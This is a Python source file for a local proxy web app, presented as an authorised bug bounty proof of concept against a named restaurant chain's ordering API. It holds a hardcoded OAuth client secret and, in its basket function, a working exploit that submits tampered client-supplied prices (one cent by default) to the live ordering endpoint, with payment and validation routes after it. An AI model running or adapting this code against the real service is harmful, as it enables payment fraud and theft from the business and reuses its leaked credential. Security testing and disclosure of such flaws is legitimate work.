#!/usr/bin/env python3
"""
O'Tacos bug bounty PoC — local webapp.

Authorized internal test against api.flyx.cloud (O'Tacos France / Flyx
backend) using a company-issued test account. This is a thin local proxy
+ static frontend: the browser never talks to api.flyx.cloud directly
(CORS/signature reasons), it talks to this local server, which forwards
requests using the same shapes the real Android app uses (verified via
live traffic capture) and returns the results to the page.

Core finding demonstrated: POST /ordering/api/Basket trusts the client-
supplied price/totalAmount instead of recomputing it server-side from
the catalog.

Run: python3 server.py   then open http://127.0.0.1:8765
"""
import datetime
import json
import os
import urllib.parse
import urllib.request
import urllib.error
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

BASE = "https://api.flyx.cloud/otacos"
CLIENT_ID = "app"
CLIENT_SECRET = "1QQ2CRDBOHVTSK5R6ZLFWJ7WQUCCM"
UA = "okhttp/4.12.0"
APPVER = {"appversion": "3.10.1", "buildnumber": "10637"}

STATIC_DIR = os.path.join(os.path.dirname(__file__), "static")


def flyx(method, path, token=None, body=None, form=None):
    url = f"{BASE}/{path}"
    headers = {"Accept": "application/json, text/plain, */*", "User-Agent": UA, **APPVER}
    data = None
    if form is not None:
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        data = urllib.parse.urlencode(form).encode()
    elif body is not None:
        headers["Content-Type"] = "application/json"
        data = json.dumps(body).encode()
    if token:
        headers["Authorization"] = f"Bearer {token}"
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            raw = r.read().decode(errors="replace")
            try:
                return r.status, json.loads(raw)
            except ValueError:
                return r.status, {"raw": raw}
    except urllib.error.HTTPError as e:
        raw = e.read().decode(errors="replace")
        try:
            return e.code, json.loads(raw)
        except ValueError:
            return e.code, {"raw": raw}
    except Exception as e:
        return 0, {"error": str(e)}


class Handler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass

    def _send(self, status, obj):
        body = json.dumps(obj).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(body)

    def _read_json(self):
        length = int(self.headers.get("Content-Length", 0))
        if not length:
            return {}
        return json.loads(self.rfile.read(length).decode())

    def do_OPTIONS(self):
        self.send_response(204)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.send_header("Access-Control-Allow-Methods", "GET,POST,OPTIONS")
        self.end_headers()

    def do_GET(self):
        if self.path == "/" or self.path == "":
            return self._serve_static("index.html")
        if self.path.startswith("/static/"):
            return self._serve_static(self.path[len("/static/"):])
        if self.path.startswith("/api/stores"):
            return self._stores()
        if self.path.startswith("/api/menu"):
            return self._menu()
        if self.path.startswith("/api/orders"):
            return self._orders()
        self._send(404, {"error": "not found"})

    def _serve_static(self, name):
        fp = os.path.join(STATIC_DIR, name)
        if not os.path.isfile(fp):
            return self._send(404, {"error": "not found"})
        ctype = "text/html" if name.endswith(".html") else (
            "application/javascript" if name.endswith(".js") else
            "text/css" if name.endswith(".css") else "application/octet-stream")
        with open(fp, "rb") as f:
            body = f.read()
        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _qs(self):
        qs = urllib.parse.urlparse(self.path).query
        return urllib.parse.parse_qs(qs)

    def _stores(self):
        params = self._qs()
        token = (params.get("token") or [None])[0]
        status, resp = flyx("GET", "ordering/api/store", token=token)
        stores = resp.get("data", []) if isinstance(resp, dict) else []
        out = [{"id": s.get("id"), "title": s.get("title"), "city": s.get("city")} for s in stores[:300]]
        self._send(200, {"status": status, "stores": out})

    def _menu(self):
        params = self._qs()
        token = (params.get("token") or [None])[0]
        store_id = (params.get("storeId") or [None])[0]
        order_type = (params.get("orderType") or ["2"])[0]
        status, resp = flyx(
            "GET",
            f"ordering/api/Product/Menu?orderSourceId=1&orderTypeId={order_type}&storeId={store_id}&languageCode=en-GB",
            token=token,
        )
        data = resp.get("data") or {} if isinstance(resp, dict) else {}
        items = data.get("items", [])
        modifier_groups = data.get("modifierGroups", [])
        by_id = {str(it.get("id")): it for it in items}

        out = []
        for it in items:
            price = (it.get("priceInfo") or {}).get("price", 0)
            if price <= 0:
                continue
            pic = it.get("picture") or {}
            entity_ids = [e.get("id") for e in (it.get("entities") or [])]
            groups = [mg for mg in modifier_groups if mg.get("id") in entity_ids]
            composable = len(groups) > 0
            out.append({
                "id": it.get("id"),
                "title": it.get("title"),
                "price": price,
                "image": pic.get("thumbnail") or pic.get("image"),
                "composable": composable,
                "groupIds": entity_ids if composable else [],
            })
        out.sort(key=lambda x: -x["price"])

        # Build a lookup of option id -> {title, image} for rendering wizard options
        options_lookup = {}
        for it in items:
            pic = it.get("picture") or {}
            options_lookup[str(it.get("id"))] = {
                "title": it.get("title"),
                "image": pic.get("thumbnail") or pic.get("image"),
            }

        groups_out = []
        for mg in modifier_groups:
            opts = []
            for e in (mg.get("entities") or []):
                oid = str(e.get("id"))
                meta = options_lookup.get(oid, {})
                opts.append({
                    "id": oid,
                    "type": e.get("type", 3),
                    "title": meta.get("title") or oid,
                    "image": meta.get("image"),
                    "default": e.get("isDefaultSelected", False),
                })
            groups_out.append({
                "id": mg.get("id"),
                "title": mg.get("title") or mg.get("subTitle") or mg.get("id"),
                "min": mg.get("minSelection", 0),
                "max": mg.get("maxSelection", 1),
                "options": opts,
            })

        self._send(200, {"status": status, "items": out[:150], "groups": groups_out})

    def do_POST(self):
        try:
            body = self._read_json()
        except Exception as e:
            return self._send(400, {"error": f"bad json: {e}"})

        routes = {
            "/api/login": self._login,
            "/api/login2fa": self._login2fa,
            "/api/canorder": self._canorder,
            "/api/basket": self._basket,
            "/api/validate": self._validate,
            "/api/payment": self._payment,
            "/api/basketstatus": self._basketstatus,
            "/api/cancel": self._cancel,
        }
        fn = routes.get(self.path)
        if not fn:
            return self._send(404, {"error": "not found"})
        fn(body)

    def _login(self, body):
        form = {
            "grant_type": "password",
            "username": body.get("email"),
            "password": body.get("password"),
            "client_id": CLIENT_ID,
            "client_secret": CLIENT_SECRET,
            "scope": "ordering_api app_api identity_api payment_api offline_access openid",
            "language": "fr-FR",
        }
        status, resp = flyx("POST", "app/Connect/Token", form=form)
        self._send(status if status else 502, resp)

    def _login2fa(self, body):
        form = {
            "grant_type": "password",
            "username": body.get("email"),
            "password": body.get("password"),
            "client_id": CLIENT_ID,
            "client_secret": CLIENT_SECRET,
            "scope": "ordering_api app_api identity_api payment_api offline_access openid",
            "language": "fr-FR",
            "code": body.get("code"),
        }
        status, resp = flyx("POST", "app/Connect/Token", form=form)
        self._send(status if status else 502, resp)

    def _canorder(self, body):
        token = body.get("token")
        store_id = body.get("storeId")
        order_type = int(body.get("orderType", 2))
        status, resp = flyx(
            "GET", f"ordering/api/store/CanOrderFromStore/{store_id}?orderType={order_type}&source=1", token=token
        )
        self._send(status if status else 502, resp)

    def _basket(self, body):
        """
        body: { token, storeId, items: [{productId, priceCents, entities: [{modifierGroupId, entity:{id,type}}]}] }
        Builds ONE basket with potentially multiple product lines, each with
        an independently client-supplied (and here, deliberately tampered)
        price — this is the core PoC: the server is expected to trust these
        verbatim instead of recomputing them from the catalog.
        """
        token = body.get("token")
        store_id = body.get("storeId")
        order_type = int(body.get("orderType", 2))
        items = body.get("items") or []
        products = []
        for it in items:
            products.append({
                "id": 0,
                "productId": it.get("productId"),
                "quantity": it.get("quantity", 1),
                "price": int(it.get("priceCents", 1)),
                "entities": it.get("entities", []),
            })
        total = sum(p["price"] * p["quantity"] for p in products)
        basket_body = {
            "id": 0,
            "creationDate": datetime.datetime.utcnow().isoformat(),
            "orderType": order_type,
            "storeId": store_id,
            "points": 0,
            "products": products,
            "totalAmount": total,
            "totalPayment": 0,
            "status": 1,
            "orderSourceId": 1,
            "paymentSourceId": 1,
            "remark": "",
        }
        status, resp = flyx("POST", "ordering/api/Basket", token=token, body=basket_body)
        self._send(status if status else 502, resp)

    def _orders(self):
        """List the account's open baskets — closest thing to 'active orders' this API exposes."""
        params = self._qs()
        token = (params.get("token") or [None])[0]
        status, resp = flyx("GET", "ordering/api/Basket", token=token)
        baskets = resp.get("data", []) if isinstance(resp, dict) else []
        if isinstance(baskets, dict):
            baskets = [baskets]
        out = []
        for b in baskets:
            out.append({
                "id": b.get("id"), "storeId": b.get("storeId"),
                "status": b.get("status"), "totalAmount": b.get("totalAmount"),
                "totalPayment": b.get("totalPayment"), "orderNumber": b.get("orderNumber"),
                "isPaid": any(p.get("isPaid") for p in (b.get("products") or [])),
                "creationDate": b.get("creationDate"),
            })
        self._send(200, {"status": status, "orders": out})

    def _basketstatus(self, body):
        token = body.get("token")
        basket_id = body.get("basketId")
        status, resp = flyx("GET", f"ordering/api/Basket/{basket_id}", token=token)
        self._send(status if status else 502, resp)

    def _cancel(self, body):
        """
        Best-effort cancel. No documented/working cancel endpoint was found during
        testing (candidates 404 or 500), so this tries the one that at least
        routes correctly and surfaces whatever the server actually says.
        """
        token = body.get("token")
        basket_id = body.get("basketId")
        status, resp = flyx("POST", f"payment/api/Payment/Cancel/Basket/{basket_id}", token=token, body={})
        self._send(status if status else 502, resp)

    def _validate(self, body):
        token = body.get("token")
        basket_id = body.get("basketId")
        status, resp = flyx("GET", f"ordering/api/basket/v2/Validate/{basket_id}", token=token)
        self._send(status if status else 502, resp)

    def _payment(self, body):
        token = body.get("token")
        basket_id = body.get("basketId")
        method = body.get("method", "creditcard")
        pay_body = {
            "basketId": basket_id, "method": method,
            "redirectUrl": "otacos://result", "saveCard": True, "language": "FR",
        }
        status, resp = flyx("POST", "payment/api/Payment", token=token, body=pay_body)
        self._send(status if status else 502, resp)


if __name__ == "__main__":
    os.makedirs(STATIC_DIR, exist_ok=True)
    port = 8765
    print(f"O'Tacos PoC webapp: http://127.0.0.1:{port}")
    ThreadingHTTPServer(("127.0.0.1", port), Handler).serve_forever()
